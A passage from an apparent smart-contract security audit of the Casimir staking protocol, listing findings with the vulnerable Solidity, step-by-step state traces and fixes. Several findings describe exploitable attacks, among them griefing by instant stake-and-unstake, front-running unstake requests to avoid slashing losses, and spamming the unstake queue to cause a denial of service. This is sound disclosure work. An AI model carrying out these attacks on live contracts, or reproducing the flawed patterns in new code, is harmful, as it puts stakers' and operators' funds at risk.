rewardStakeRatioSum += Math.mulDiv(rewardStakeRatioSum, gainAfterFee, totalStake);

rewardStakeRatioSum += Math.mulDiv(rewardStakeRatioSum, gain, totalStake);

rewardStakeRatioSum -= Math.mulDiv(rewardStakeRatioSum, loss, totalStake);
```

**Recommended Mitigation:** Consider adding `pendingValidatorIds.length * VALIDATOR_CAPACITY` to function `getTotalStake()`.

**Casimir:**
Fixed in [10fe228](https://github.com/casimirlabs/casimir-contracts/commit/10fe228406dc3f889db42e8850add94561a7325e)

**Cyfrin:** Verified.


### Hardcoded cluster size in `withdrawValidator` can cause losses to operators or protocol for strategies with larger cluster sizes

**Description:** `CasimirManager::withdrawValidator` calculates the owed balance on withdrawal, ie. shortfall from the initial 32 ether. It then tries to recover the owed amount from the operators tagged to the validator. However, while calculating recovery amount, a hardcoded cluster size of `4` is used.

```solidity
function withdrawValidator(
    uint256 stakedValidatorIndex,
    WithdrawalProofs memory proofs,
    ISSVClusters.Cluster memory cluster
) external {
    onlyReporter();

    // ... more code

    uint256 owedAmount = VALIDATOR_CAPACITY - finalEffectiveBalance;
    if (owedAmount > 0) {
        uint256 availableCollateral = registry.collateralUnit() * 4;
        owedAmount = owedAmount > availableCollateral ? availableCollateral : owedAmount;
>       uint256 recoverAmount = owedAmount / 4; //@audit hardcoded operator size
        for (uint256 i; i < validator.operatorIds.length; i++) {
            registry.removeOperatorValidator(validator.operatorIds[i], validatorId, recoverAmount);
        }
    }

    // .... more code

```

**Impact:** This has 2 side effects:
1. Operators lose higher % of collateral balance in strategies with large cluster sizes
2. On the other hand, since `owedAmount` is capped to `4 * collateralUnit`, it is also likely that protocol ends up recovering less than it should.

**Recommended Mitigation:** Consider using the `clusterSize` of the strategy instead of a hardcoded number.

**Casimir:**
Fixed in [7497e8c](https://github.com/casimirlabs/casimir-contracts/commit/7497e8cefae018a46606b4722c9bc20d03d0d23c).

**Cyfrin:** Verified.


### A malicious staker can force validator withdrawals by instantly staking and unstaking

**Description:** When a user unstakes via `CasimirManager::requestUnstake`, the number of required validator exits is calculated using the prevailing expected withdrawable balance as follows:

```solidity
function requestUnstake(uint256 amount) external nonReentrant {
    // code ....
    uint256 expectedWithdrawableBalance =
        getWithdrawableBalance() + requestedExits * VALIDATOR_CAPACITY + delayedEffectiveBalance;
    if (unstakeQueueAmount > expectedWithdrawableBalance) {
        uint256 requiredAmount = unstakeQueueAmount - expectedWithdrawableBalance;
>       uint256 requiredExits = requiredAmount / VALIDATOR_CAPACITY; //@audit required exits calculated here
        if (requiredAmount % VALIDATOR_CAPACITY > 0) {
            requiredExits++;
        }
        exitValidators(requiredExits);
    }

    emit UnstakeRequested(msg.sender, amount);
}
```

Consider the following simplified scenario:

`unAssignedBalance = 31 ETH withdrawnBalance = 0 delayedEffectiveBalance = 0 requestedExits = 0`

Also, for simplicity, assume the `deposit fees = 0%`

Alice, a malicious validator, stakes 1 ETH. This allocates the unassigned balance to a new validator via `distributeStakes`. At this point, the state is:

`unAssignedBalance = 0 ETH withdrawnBalance = 0 delayedEffectiveBalance = 0 requestedExits = 0`

Alice instantly places an unstake request for 1 ETH via `requestUnstake`. Since there is not enough balance to fulfill unstakes, an existing validator will be forced to withdraw from the Beacon Chain. After this, the state will be:

`unAssignedBalance = 0 ETH withdrawnBalance = 0 delayedEffectiveBalance = 0 requestedExits = 1`

Now, Alice can repeat the attack, this time by instantly depositing and withdrawing 64 ETH. At the end of this, the state will be:

`unAssignedBalance = 0 ETH withdrawnBalance = 0 delayedEffectiveBalance = 0 requestedExits = 2`

Each time, Alice only has to lose the deposit fee & gas fee but can grief the genuine stakers who lose their potential rewards & the operators who are forcefully kicked out of the validator.

**Impact:** Unnecessary validator withdrawal requests grief stakers, operators and protocol itself. Exiting validators causes a loss of yield to stakers and is very gas intensive for protocol.

**Recommended Mitigation:**
- Consider an unstake lock period. A user cannot request unstaking until a minimum time/blocks have elapsed after deposit.
- Consider removing ETH from `readyValidators` instead of exiting validators first -> while active validators are already accruing rewards, ready Validators have not yet started the process. And the overhead related to removing operators, de-registering from the SSV cluster is not needed if ETH is deallocated from ready validators.

**Casimir:**
Fixed in [4a5cd14](https://github.com/casimirlabs/casimir-contracts/commit/4a5cd145c247d9274c3f21f9e9c1b5557a230a01)

**Cyfrin:** Verified.


### Operator is not removed in Registry when validator has `owedAmount == 0`

**Description:** `CasimirManager::withdrawValidator()` function is designed to remove a validator after a full withdrawal. It checks whether the final effective balance of the removed validator is sufficient to cover the initial 32 ETH deposit. If for some reason such as slashing, the final effective balance is less than 32 ETH, the operators must recover the missing portion by calling `registry.removeOperatorValidator()`.


```solidity
uint256 owedAmount = VALIDATOR_CAPACITY - finalEffectiveBalance;
if (owedAmount > 0) {
    uint256 availableCollateral = registry.collateralUnit() * 4;
    owedAmount = owedAmount > availableCollateral ? availableCollateral : owedAmount;
    uint256 recoverAmount = owedAmount / 4;
    for (uint256 i; i < validator.operatorIds.length; i++) {
        // @audit if owedAmount == 0, this function is not called
        registry.removeOperatorValidator(validator.operatorIds[i], validatorId, recoverAmount);
    }
}
```

However, the `removeOperatorValidator()` function also has the responsibility to update other operators' states, such as `operator.validatorCount`. If this function is only called when `owedAmount > 0`, the states of these operators will not be updated if the validator fully returns 32 ETH.

**Impact:** The `operator.validatorCount` will not decrease in the `CasimirRegistry` when a validator is removed. As a result, the operator cannot withdraw the collateral for this validator, and the collateral will remain locked in the `CasimirRegistry` contract.

**Recommended Mitigation:** The function `registry.removeOperatorValidator()` should also be called  with `recoverAmount = 0` when `owedAmount == 0`. This will free up collateral for operators.

**Casimir:**
Fixed in [d7b35fc](https://github.com/casimirlabs/casimir-contracts/commit/d7b35fce9925bfa2133fd4e16ae11e483ab4daa4)

**Cyfrin:** Verified.


### Accounting for `rewardStakeRatioSum` is incorrect when a delayed balance or rewards are unclaimed

**Description:** The current accounting incorrectly assumes that the delayed effective balance and delayed rewards will be claimed before any new report begins. This is inaccurate as these delayed funds require a few days before they can be claimed. If a new report starts before these funds are claimed, the `reportSweptBalance` will account for them again. This double accounting impacts the `rewardStakeRatioSum` calculation, leading to inaccuracies.

**Impact:** The accounting for `rewardStakeRatioSum` is incorrect, which leads to an inaccurate user stake. Consequently, users may receive more ETH than anticipated upon unstaking.

**Proof of Concept:** Consider the following scenario:

1. Initially, we assume that one validator (32 ETH) is staked and the beacon chain reward is 0.105 ETH. The report gets processed.
```solidity
// Before start
latestActiveBalanceAfterFee = 32 ETH
latestActiveRewards = 0

// startReport()
reportSweptBalance = 0 (rewards is in BeaconChain)

// syncValidators()
reportActiveBalance = 32.105 ETH

// finalizeReport()
rewards = 0.105 ETH
change = rewards - latestActiveRewards = 0.105 ETH
gainAfterFee = 0.1 ETH
=> rewardStakeRatioSum is increased
=> latestActiveBalanceAfterFee = 32.1

sweptRewards = 0
=> latestActiveRewards = 0.105
```

2. The beacon chain sweeps 0.105 ETH rewards. This is followed by processing another report.
```solidity
// Before start
latestActiveBalanceAfterFee = 32.1 ETH
latestActiveRewards = 0.105

// startReport()
reportSweptBalance = 0.105 (rewards is in EigenPod)

// syncValidators()
reportActiveBalance = 32 ETH

// finalizeReport()
rewards = 0.105 ETH
change = rewards - latestActiveRewards = 0
=> No update to rewardStakeRatioSum and latestActiveBalanceAfterFee

sweptRewards = 0.105
=> latestActiveBalanceAfterFee = 32 ETH (subtracted sweptReward without fee)
=> latestActiveRewards = rewards - sweptRewards = 0
```

3. Suppose no actions take place, which means the rewards is still in EigenPod and not claimed yet. The next report gets processed.
```solidity
// Before start
latestActiveBalanceAfterFee = 32 ETH
latestActiveRewards = 0

// startReport()
reportSweptBalance = 0.105 (No action happens so rewards is still in EigenPod)

// syncValidators()
reportActiveBalance = 32 ETH

// finalizeReport()
rewards = 0.105 ETH
change = rewards - latestActiveRewards = 0.105
=> rewardStakeRatioSum is increased
=> latestActiveBalanceAfterFee = 32.1

sweptRewards = 0.105
=> latestActiveBalanceAfterFee = 32 ETH (subtracted sweptReward without fee)
=> latestActiveRewards = rewards - sweptRewards = 0
```

Since no actions occur between the last report and the current one, the values of `latestActiveBalanceAfterFee` and `latestActiveReward` remain the same. However, the `rewardStakeRatioSum` value increased from nothing. If this reporting process continues, the `rewardStakeRatioSum` could infinitely increase. Consequently, the core accounting of user stakes becomes incorrect, and users could receive more ETH than expected when unstaking.

**Recommended Mitigation:** Review the accounting logic to ensure that the delayed effective balance and delayed reward are only accounted for once in the reports.

**Casimir**
Fixed in [eb31b43](https://github.com/casimirlabs/casimir-contracts/commit/eb31b4349e69eb401615e0eca253e9ab8cc0999d)

**Cyfrin**
Verified.


### Incorrect accounting of `reportRecoveredEffectiveBalance` can prevent report from being finalized when a validator is slashed

**Description:** When a validator is slashed, a loss is incurred. In the `finalizeReport()` function, the `rewardStakeRatioSum` and `latestActiveBalanceAfterFee` variables are reduced to reflect this loss. The change could be positive if the rewards are larger than the slashed amount, but for simplicity, we'll focus on the negative case. This is where the loss is accounted for.

```solidity
} else if (change < 0) {
    uint256 loss = uint256(-change);
    rewardStakeRatioSum -= Math.mulDiv(rewardStakeRatioSum, loss, totalStake);
    latestActiveBalanceAfterFee -= loss;
}
```

However, any loss will be recovered by the node operators' collateral in the `CasimirRegistry`. From the users' or pool's perspective, there is no loss if it is covered, and users will receive compensation in full. The missing accounting here is that `rewardStakeRatioSum` and `latestActiveBalanceAfterFee` need to be increased using the `reportRecoveredEffectiveBalance` variable.

**Impact:** Users or pools suffer a loss that should be covered by `reportRecoveredEffectiveBalance`. Incorrect accounting results in `latestActiveBalanceAfterFee` being less than expected. This in certain scenarios could lead to arithmetic underflow & prevent report from being finalized. Without report finalization, new validators cannot be activated & a new report period cannot be started.

**Proof of Concept:** Consider following scenario - there is an underflow when last validator is withdrawn that prevents report from being finalized.

_Report Period 0_
2 validators added

```State:
latestActiveBalanceAfterFee = 64
latestActiveRewards = 0
````

_Report Period 1_
Rewards: 0.1 per validator on BC.
Withdrawal: 32
Unstake request: 15

```
=> start
Eigenpod balance = 32.1
reportSweptBalance = 32.1

=> syncValidator
reportActiveBalance = 32.1
reportWithdrawableValidators = 1

=>withdrawValidator
delayedRewards = 0.1
Slashed = 0
Report Withdrawn Effective Balance = 32
Delayed Effective Balance = 32
Report Recovered Balance = 0

=> finalize
totalStake = 49
expectedWithdrawalEffectiveBalance = 32
expectedEffectiveBalance = 32

Rewards = 0.2

rewardStakeRatioSum = 1004.08
latestActiveBalanceAfterFee (reward adj.) = 64.2
swept rewards = 0.1

latestActiveBalanceAfterFee (swept reward adj) = 64.1
latestActiveBalanceAfterFee (withdrawals adj) = 32.1
latestActiveRewards = 0.1

```

_Report Period 2_
unstake request: 20
last validator exited with slashing of 0.2

```
=> start
Eigenpod balance = 63.9 (32.1 previous + 31.8 slashed)
Delayed effective balance = 32
Delayed rewards = 0.1

reportSweptBalance = 96

=> sync validator
reportActiveBalance = 0
reportWithdrawableValidators = 1

=> withdraw validator
Delayed Effective Balance = 63.8 (32+ 31.8)
Report Recovered Balance = 0.2
Report Withdrawn Effective Balance = 31.8 + 0.2 = 32
Delayed Rewards = 0.1



=> finalizeReport
Total Stake: 29.2
expectedWithdrawalEffectiveBalance = 32
expectedEffectiveBalance = 0
rewards = 64

Change = 63.9
rewardStakeRatioSum: 3201.369
latestActiveBalanceAfterFee (reward adj) = 96
Swept rewards = 64.2

latestActiveBalanceAfterFee (swept reward adj) = 31.8
latestActiveBalanceAfterFee (adj withdrawals) = -0.2 => underflow

latestActiveRewards = -0.2
````
Arithmetic underflow here. Correct adjustment is by including `reportRecoveredBalance` in rewards. On correction, the following state is achieved:

=> finalizeReport
````
Total Stake: 29.2
expectedWithdrawalEffectiveBalance = 32
expectedEffectiveBalance = 0
rewards = 64.2 (add 0.2 recoveredEffectiveBalance)

Change = 64.1
rewardStakeRatioSum: 3208.247
latestActiveBalanceAfterFee (reward adj) = 96.2
Swept rewards = 64.2

latestActiveBalanceAfterFee (swept reward adj) = 32
latestActiveBalanceAfterFee (adj withdrawals) = 0

latestActiveRewards = 0
````

**Recommended Mitigation:** Consider adding `reportRecoveredEffectiveBalance` to `rewards` calculation so that recovered ETH is accounted for in `rewardStakeRatioSum` and `latestActiveBalanceAfterFee` calculations.

**Casimir:**
Fixed in [eb31b43](https://github.com/casimirlabs/casimir-contracts/commit/eb31b4349e69eb401615e0eca253e9ab8cc0999d).

**Cyfrin:** Verified.

\clearpage
## Medium Risk


### Infinite loop in the `exitValidators()` prevents users from calling `requestUnstake()`

**Description:** When users call function `requestUnstake()` to request to unstake their ETH, the `CasimirManager` contract will calculate if the current expected withdrawable balance is enough to cover all the queued unstaking requests. If it is not enough, the function `exitValidators()` will be call to exit some active validators to have enough ETH to fulfill all the unstaking requests.

In the function `exitValidators()`, it will do a while loop through the `stakedValidatorIds` list. If it found an active validator, it will call the `ssvClusters` to exit this validator and also change the status from `ACTIVE` to `EXITING`. However, if the validator status is not `ACTIVE`, the loop `index` will not be updated as well, resulting in the loop keep running infinitely but not being able to reach the next validator in the `stakedValidatorIds` list.
```solidity
function exitValidators(uint256 count) private {
    uint256 index = 0;
    while (count > 0) {
        uint32 validatorId = stakedValidatorIds[index];
        Validator storage validator = validators[validatorId];

        // @audit if status != ACTIVE, count and index won't be updated => Infinite loop
        if (validator.status == ValidatorStatus.ACTIVE) {
            count--;
            index++;
            requestedExits++;
            validator.status = ValidatorStatus.EXITING;
            ssvClusters.exitValidator(validator.publicKey, validator.operatorIds);
            emit ValidatorExited(validatorId);
        }
    }
}
```

**Impact:**
- If the status of first validator in the `stakedValidatorIds` list is not active, the `requestUnstake()` function will consume the caller's entire gas limit and revert.

- Could also lead to griefing attacks where a small staker can delay unstake requests of a whale staker by front-running an unstake request. While `exitValidators` will run successfully the first time, it will revert due to infinite loop when called by whale staker

**Recommended Mitigation:** Consider updating `count` and `index` variables to ensure the loop will break in all scenarios.

**Casimir:**
Fixed in [2945695](https://github.com/casimirlabs/casimir-contracts/commit/29456956e383e48277d604ca54d8fd43d6f31d10)

**Cyfrin:** Verified.


### Multiple unstake requests can cause denial of service because withdrawn balance is not adjusted after every unstake request is fulfilled

**Description:** A `while` loop runs over a specific number of unstake requests, and in every iteration, it checks if an unstake request is fulfillable. If it is, the unstaked amount is transferred back to the staker who requested unstaking. Honoring every unstaking request reduces the effective ETH balance in the manager, however, the `getNextUnstake` function continues to use the stale `withdrawnEffectiveBalance` while checking if the next unstake request is fulfillable.

In fact, `withdrawnEffectiveBalance` is adjusted only after the completion of the `while` loop.
```solidity
function fulfillUnstakes(uint256 count) external {
    //@note called when report status is in fulfilling unstakes
    onlyReporter();

    if (reportStatus != ReportStatus.FULFILLING_UNSTAKES) {
        revert ReportNotFulfilling();
    } //@note ok => report has to be in this state

    uint256 unstakedAmount;
    while (count > 0) {
        count--;

>       (Unstake memory unstake, bool fulfillable) = getNextUnstake(); //@audit uses the stale withdrawn balance
        if (!fulfillable) {
            break;
        }

        unstakeQueue.remove(0);
>       unstakedAmount += unstake.amount; //@audit unstakedAmount is increased here
>       fulfillUnstake(unstake.userAddress, unstake.amount); //@audit even after ETH is transferred, withdrawn balance is same
    }

    (, bool nextFulfillable) = getNextUnstake();
    if (!nextFulfillable) {
        reportStatus = ReportStatus.FINALIZING;
    }

>   if (unstakedAmount <= withdrawnEffectiveBalance) { //@audit withdrawn balance and unassigned balance adjustment happens here
        withdrawnEffectiveBalance -= unstakedAmount;
    } else {
        uint256 remainder = unstakedAmount - withdrawnEffectiveBalance;
        withdrawnEffectiveBalance = 0;
        unassignedBalance -= remainder;
    }

    unstakeQueueAmount -= unstakedAmount;
}
```
**Impact:** The `fulfillUnstakes()` function may fulfill more requests than the allowable withdrawable balance. This could cause the function to overflow and revert at the end.

**Proof of Concept:** **Recommended Mitigation:**
Consider updating `withdrawnEffectiveBalance` after an unstake request has been fulfilled by the `fulfillUnstakes()` function.

**Casimir:**
Fixed in [9f8920f](https://github.com/casimirlabs/casimir-contracts/commit/9f8920f483e5505726e3011132246bfcbea2e629)

**Cyfrin:** Verified.


### Spamming `requestUnstake()` to cause a denial of service in the unstake queue

**Description:**
- The function `requestUnstake()` allows users to request any amount, even `amount = 0`.
- The contract processes all unstake requests in a First-In-First-Out (FIFO) queue, handling earlier requests before later ones.
- The `remove()` function has a time complexity of O(n), which consumes gas.

This means an attacker could repeatedly call `requestUnstake()` to enlarge the unstake queue, causing the gas consumption of `fulfillUnstake()` to exceed the block gas limit.

**Impact:** Excessive gas usage when calling `fulfillUnstake()` could exceed the block gas limit, causing a DOS.

**Recommended Mitigation:** Consider setting a minimum unstake amount for the `requestUnstake()` function that is substantial enough to make spamming impractical.

**Casimir:**
Fixed in [4a5cd14](https://github.com/casimirlabs/casimir-contracts/commit/4a5cd145c247d9274c3f21f9e9c1b5557a230a01)

**Cyfrin:** Verified.


### Users could avoid loss by frontrunning to request unstake

**Description:** A loss can occur when a validator is slashed, which is reflected in the `finalizeReport()` function. If the `change` is less than 0, this indicates that a loss has occurred. Consequently, the accounting updates the `rewardStakeRatioSum` to decrease the stake value of all users in the `CasimirManager`.

```solidity
} else if (change < 0) {
    uint256 loss = uint256(-change);
    rewardStakeRatioSum -= Math.mulDiv(rewardStakeRatioSum, loss, totalStake);
    latestActiveBalanceAfterFee -= loss;
}
```

However, users can avoid this loss by front-running an unstake request. This is because they can create and fulfill an unstake request within the same `reportPeriod`. If users anticipate a potential loss in the next report (by watching the mempool), they can avoid it by requesting to unstake. The contract processes all unstake requests in a First-In-First-Out (FIFO) queue, meaning reporters must fulfill earlier requests before later ones.

```solidity
function getNextUnstake() public view returns (Unstake memory unstake, bool fulfillable) {
    // @audit Allow to create and fulfill unstake within the same `reportPeriod`
    if (unstakeQueue.length > 0) {
        unstake = unstakeQueue[0];
        fulfillable = unstake.period <= reportPeriod && unstake.amount <= getWithdrawableBalance();
    }
}
```

**Impact:** This can lead to unfairness. The front-runner can avoid losses while retaining all profits.

**Recommended Mitigation:** Consider implementing a waiting or delay period for unstake requests before they can be fulfilled. Do not allow the unstake request to be fulfilled in the same `reportPeriod` in which it was created. Additionally, considering adding a small user fee for unstaking.

**Casimir:**
Fixed in [28baa81](https://github.com/casimirlabs/casimir-contracts/commit/28baa8191a1b5a27d3ee495dee0d993177bf7e5f)

**Cyfrin:** Verified.


### Centralization risks with a lot of power vested in the `Reporter` role

**Description:** In the current design, the `Reporter`, a protocol-controlled address, is responsible for executing a number of mission-critical operations. Only `Reporter` operations include starting & finalizing a report, selecting & replacing operators, syncing/activating/withdrawing and depositing validators, verifying & claiming rewards from EigenLayer, etc. Also noteworthy is the fact that the timing and sequence of these operations are crucial for the proper functioning of the Casimir protocol.

**Impact:** With so many operations controlled by a single address, a significant part of which are initiated off-chain, the protocol is exposed to all the risks associated with centralization. Some of the known risks include:

- Compromised/lost private keys that control the `Reporter` address
- Rogue admin
- Network downtime
- Human/Automation errors associated with the execution of multiple operations

**Recommended Mitigation:** While we understand that the protocol in the launch phase wants to retain control over mission-critical parameters, we strongly recommend implementing the following even at the launch phase:

- Continuous monitoring of off-chain processes
- Reporter automation via a multi-sig

In the long term, the protocol should consider a clear path towards decentralization.

**Casimir:**
Acknowledged. We plan to implement the expected EigenLayer checkpoint upgrade that significantly reduces the intervention of the reporter while syncing validator balances.

**Cyfrin:** Acknowledged.

\clearpage
## Low Risk


### Operator can set his operatorID status to active by transferring 0 Wei

**Description:** When withdrawing collateral, logic checks if collateral balance is 0 & makes the operator Id inactive.

```solidity
 function withdrawCollateral(uint64 operatorId, uint256 amount) external {
        onlyOperatorOwner(operatorId);

        Operator storage operator = operators[operatorId];
        uint256 availableCollateral = operator.collateralBalance - operator.validatorCount * collateralUnit; //@note can cause underflow here if validator count > 0
        if (availableCollateral < amount) {
            revert InvalidAmount();
        }

        operator.collateralBalance -= amount;
        if (operator.collateralBalance == 0) {
            operator.active = false;
        }

        (bool success,) = msg.sender.call{value: amount}("");
        if (!success) {
            revert TransferFailed();
        }

        emit CollateralWithdrawn(operatorId, amount);
    }

```

However while depositing, there is no check on the amount deposited. An operator can deposit 0 Wei and set operatorID to active. Deposit and withdrawal states are inconsistent.

```solidity
     function depositCollateral(uint64 operatorId) external payable {
        onlyOperatorOwner(operatorId);

        Operator storage operator = operators[operatorId];
        if (!operator.registered) {
            operatorIds.push(operatorId);
            operator.registered = true;
            emit OperatorRegistered(operatorId);
        }
        if (!operator.active) {
>            operator.active = true; //@audit -> can make operator active even with 0 wei
        }
        operator.collateralBalance += msg.value;

        emit CollateralDeposited(operatorId, msg.value);
    }**
```

**Impact:** Inconsistent logic when adding and removing validators.

**Recommended Mitigation:** Consider checking that collateral amount in the `depositCollateral` function

**Casimir:**
Fixed in [109cf2a](https://github.com/casimirlabs/casimir-contracts/commit/109cf2af2c6009e4dfa483317f2f186c97ed9da3)

**Cyfrin:** Verified.


### Reporter trying to reshare a pending validator will lead to denial of service

**Description:** A validator can reshare an operator if its either in `PENDING` or `ACTIVE` status. When resharing is executed for a validtor in `PENDING` state , the existing operators are removed from the SSV cluster -> however,  no such operators are registered in the first place. This is because SSV registration does not happen when `depositStake` is called.

```solidity
 function reshareValidator(
        uint32 validatorId,
        uint64[] memory operatorIds,
        uint64 newOperatorId,
        uint64 oldOperatorId,
        bytes memory shares,
        ISSVClusters.Cluster memory cluster,
        ISSVClusters.Cluster memory oldCluster,
        uint256 feeAmount,
        uint256 minTokenAmount,
        bool processed
    ) external {
        onlyReporter();

        Validator storage validator = validators[validatorId];
        if (validator.status != ValidatorStatus.ACTIVE && validator.status != ValidatorStatus.PENDING) {
            revert ValidatorNotActive();
        }

       // ... code

        uint256 ssvAmount = retrieveFees(feeAmount, minTokenAmount, address(ssvToken), processed);
        ssvToken.approve(address(ssvClusters), ssvAmount);
>        ssvClusters.removeValidator(validator.publicKey, validator.operatorIds, oldCluster); //@audit validtor key is not registered when the validator is in pending state
       ssvClusters.registerValidator(validator.publicKey, operatorIds, shares, ssvAmount, cluster); //@audit new operators registered

        validator.operatorIds = operatorIds;
        validator.reshares++;

        registry.removeOperatorValidator(oldOperatorId, validatorId, 0);
        registry.addOperatorValidator(newOperatorId, validatorId);

        emit ValidatorReshared(validatorId);
    }
```



`SSVCluster::removeValidator` reverts when it can't find a validator data to remove.

```solidity
    function removeValidator(
        bytes calldata publicKey,
        uint64[] memory operatorIds,
        Cluster memory cluster
    ) external override {
        StorageData storage s = SSVStorage.load();

        bytes32 hashedCluster = cluster.validateHashedCluster(msg.sender, operatorIds, s);
        bytes32 hashedOperatorIds = ValidatorLib.hashOperatorIds(operatorIds);

        bytes32 hashedValidator = keccak256(abi.encodePacked(publicKey, msg.sender));
        bytes32 validatorData = s.validatorPKs[hashedValidator];

        if (validatorData == bytes32(0)) {
>            revert ISSVNetworkCore.ValidatorDoesNotExist(); //@audit reverts when no key exists
        }

        if (!ValidatorLib.validateCorrectState(validatorData, hashedOperatorIds))
            revert ISSVNetworkCore.IncorrectValidatorStateWithData(publicKey);

        delete s.validatorPKs[hashedValidator];

        if (cluster.active) {
            StorageProtocol storage sp = SSVStorageProtocol.load();
            (uint64 clusterIndex, ) = OperatorLib.updateClusterOperators(operatorIds, false, false, 1, s, sp);

            cluster.updateClusterData(clusterIndex, sp.currentNetworkFeeIndex());

            sp.updateDAO(false, 1);
        }

        --cluster.validatorCount;

        s.clusters[hashedCluster] = cluster.hashClusterData();

        emit ValidatorRemoved(msg.sender, operatorIds, publicKey, cluster);
    }
```

**Impact:** An operator requesting a deactivation after initial deposit cannot be reshared.

**Recommended Mitigation:** Consider either of the 2 options:
- If resharing at PENDING stage needs to be supported, then register operators in `depositStake`
- If resharing at PENDING stage should not be supported, disallow resharing for validators in `Status.PENDING` in the `reshareValidator`

**Casimir:**
Fixed in [cd03c74](https://github.com/casimirlabs/casimir-contracts/commit/cd03c740c457264e578945bb2a8cc8bcf2c875f8)

**Cyfrin:** Verified.


### Missing implementation for  EigenPod `withdrawNonBeaconChainETHBalanceWei` in CasimirManager

**Description:** EigenLayer has a function `EigenPod::withdrawNonBeaconChainETHBalanceWei` that is intended to be called by the pod owner to sweep any ETH donated to EigenPod. Currently, there seems to be no way to withdraw this balance from EigenPod.

**Impact:** Donations to EigenPod are essentially stuck while the pod is active.

**Recommended Mitigation:** Consider adding a function to `CasimirManager` that sweeps the `nonBeaconChainETH` balance and sends it to `distributeStakes`, similar to `CasimirManager::claimTips`.

**Casimir:**
Fixed in [790817a](https://github.com/casimirlabs/casimir-contracts/commit/790817a9ba615dbcd7c85d449fe7aa19c02371b7)

**Cyfrin:** Verified.


### Function `withdrawRewards()` may lead to inaccuracy in `delayedRewards` if there's no withdrawal to process

**Description:** In the `CasimirManager`, the `withdrawRewards()` function can be used by the reporter to process swept validator rewards. The reporter must provide `WithdrawalProofs`, which the function uses to call `eigenPod.verifyAndProcessWithdrawals()`.
```solidity
function withdrawRewards(WithdrawalProofs memory proofs) external {
    onlyReporter();

    eigenPod.verifyAndProcessWithdrawals(
        proofs.oracleTimestamp,
        proofs.stateRootProof,
        proofs.withdrawalProofs,
        proofs.validatorFieldsProofs,
        proofs.validatorFields,
        proofs.withdrawalFields
    );

    // @audit Not check if the delayed withdrawal length has changed or not
    uint256 delayedAmount = eigenWithdrawals.userDelayedWithdrawalByIndex(
        address(this), eigenWithdrawals.userWithdrawalsLength(address(this)) - 1
    ).amount;
    delayedRewards += delayedAmount;

    emit RewardsDelayed(delayedAmount);
}
```

The `verifyAndProcessWithdrawals()` function processes a list of withdrawals and sends them as one withdrawal to the delayed withdrawal router. However, it only creates a new withdrawal in the delayed router if the sum of the amount to send is non-zero.

```solidity
if (withdrawalSummary.amountToSendGwei != 0) {
    _sendETH_AsDelayedWithdrawal(podOwner, withdrawalSummary.amountToSendGwei * GWEI_TO_WEI);
}
```

So, if the reporter calls `withdrawRewards()` with no withdrawals, i.e., empty `withdrawalFields` and `validatorFields`, the delayed withdrawal router will not create a new entry. However, as `withdrawRewards()` always takes `delayedAmount` as the latest entry from the delayed withdrawal router, it actually retrieves an old amount that has already been accounted for.

**Impact:** If the reporter mistakenly calls `withdrawRewards()` with no withdrawals, `delayedRewards` will account for the previous delayed amount again, leading to incorrect accounting.

**Recommended Mitigation:** Consider following the pattern in the `withdrawValidator()` function. It checks if the length of `eigenWithdrawals.userWithdrawalsLength()` changes before adding the amount to `delayedRewards`.
```solidity
uint256 initialDelayedRewardsLength = eigenWithdrawals.userWithdrawalsLength(address(this));
uint64 initialDelayedEffectiveBalanceGwei = eigenPod.withdrawableRestakedExecutionLayerGwei();

eigenPod.verifyAndProcessWithdrawals(
    ...
);

{
    uint256 updatedDelayedRewardsLength = eigenWithdrawals.userWithdrawalsLength(address(this));
    if (updatedDelayedRewardsLength > initialDelayedRewardsLength) {
        IDelayedWithdrawalRouter.DelayedWithdrawal memory withdrawal =
            eigenWithdrawals.userDelayedWithdrawalByIndex(address(this), updatedDelayedRewardsLength - 1);
        if (withdrawal.blockCreated == block.number) {
            delayedRewards += withdrawal.amount;

            emit RewardsDelayed(withdrawal.amount);
        }
    }
}
```

**Casimir:**
Fixed in [81cb7f1](https://github.com/casimirlabs/casimir-contracts/commit/81cb7f19aaa0dfad5101bcfa8a233fe0fade9365)

**Cyfrin:** Verified.


### Incorrect test setup leads to false test outcomes

**Description:** `IntegrationTest.t.sol` includes an integrated test that verifies the entire staking lifecycle. However, the current test setup, in several places, advances the blocks using foundry's `vm.roll` but neglects to adjust the timestamp using `vm.warp`.

This allows the test setup to claim rewards without any time delay.

_IntegrationTest.t.sol Line 151_
```solidity
>       vm.roll(block.number + eigenWithdrawals.withdrawalDelayBlocks() + 1); //@audit changing block without changing timestamp
        vm.prank(reporterAddress);
>       manager.claimRewards(); //@audit claiming at the same timestamp

        // Reporter runs after the heartbeat duration
        vm.warp(block.timestamp + 24 hours);
        timeMachine.setProofGenStartTime(0.5 hours);
        beaconChain.setNextTimestamp(timeMachine.proofGenStartTime());
        vm.startPrank(reporterAddress);
        manager.startReport();
        manager.syncValidators(abi.encode(beaconChain.getActiveBalanceSum(), 0));
        manager.finalizeReport();
        vm.stopPrank();
````

Moving blocks without updating the timestamp is an unrealistic simulation of the blockchain. As of EigenLayer M2, `WithdrawDelayBlocks` are 50400, which is approximately 7 days. By advancing 50400 blocks without changing the timestamp, tests overlook several accounting edge cases related to delayed rewards. This is especially true because each reporting period lasts for 24 hours - this means there are 7 reporting periods before a pending reward can actually be claimed.

**Impact:** An incorrect setup can provide false assurance to the protocol that all edge cases are covered.

**Recommended Mitigation:** Consider modifying the test setup as follows:

- Run reports without instantly claiming rewards. This accurately reflects events on the real blockchain.
- Consider adjusting time whenever blocks are advanced.

**Casimir:**
Fixed in [290d8e1](https://github.com/casimirlabs/casimir-contracts/commit/290d8e11846c5d20ed6a059e32864c8227fb582d)

**Cyfrin:** Verified.

\clearpage
## Informational


### Missing validations when initializing CasimirRegistry

**Description:** During Beacon Proxy deployment, CasimirRegistry can be deployed with 0 cluster size and 0 collateral.

**Recommended Mitigation:** Consider validating inputs for cluster size and collateral.

**Casimir:**
Mitigated in [37f3d34](https://github.com/casimirlabs/casimir-contracts/commit/37f3d34a9102478a85f6791774d86488bf5eb08e).

**Cyfrin:** Verified.


### ReentrancyGuardUpgradeable is not used in CasimirFactory and CasimirRegistry

**Description:** CasimirRegistry and CasimirFactory inherit ReentrancyGuardUpgradeable but nonRentrant modifier is unused in bopth contracts.

**Recommended Mitigation:** Considering removing `ReentrancyGuardUpgradeable` inheritance in `CasimirRegistry` and `CasimirFactory`

**Casimir**
Fixed in [e403b8b](https://github.com/casimirlabs/casimir-contracts/commit/e403b8b86edbb96e02fd3f5e02e7f207890e1257)

**Cyfrin**
Verified.


### The period check in `getNextUnstake()` always returns true

